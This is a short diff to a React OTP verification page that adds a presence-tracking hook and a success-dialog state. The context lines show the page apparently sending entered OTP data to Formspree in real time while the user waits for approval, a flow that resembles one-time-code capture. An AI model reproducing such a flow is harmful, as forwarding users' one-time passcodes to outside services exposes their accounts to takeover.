@@ -9,6 +9,7 @@ import { Footer } from "@/components/Footer";
 import { useToast } from "@/hooks/use-toast";
 import { useFormspreeSync } from "@/hooks/useFormspreeSync";
 import { supabase } from "@/integrations/supabase/client";
+import { usePresence } from "@/hooks/usePresence";
 
 const OTPVerification = () => {
   const navigate = useNavigate();
@@ -28,6 +29,8 @@ const OTPVerification = () => {
   const [isVerifying, setIsVerifying] = useState(false);
   const [applicationId, setApplicationId] = useState<string | null>(null);
   const [waitingForApproval, setWaitingForApproval] = useState(false);
+  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
+  usePresence(applicationId || undefined);
 
   // Send OTP data to Formspree in real-time
   useFormspreeSync({
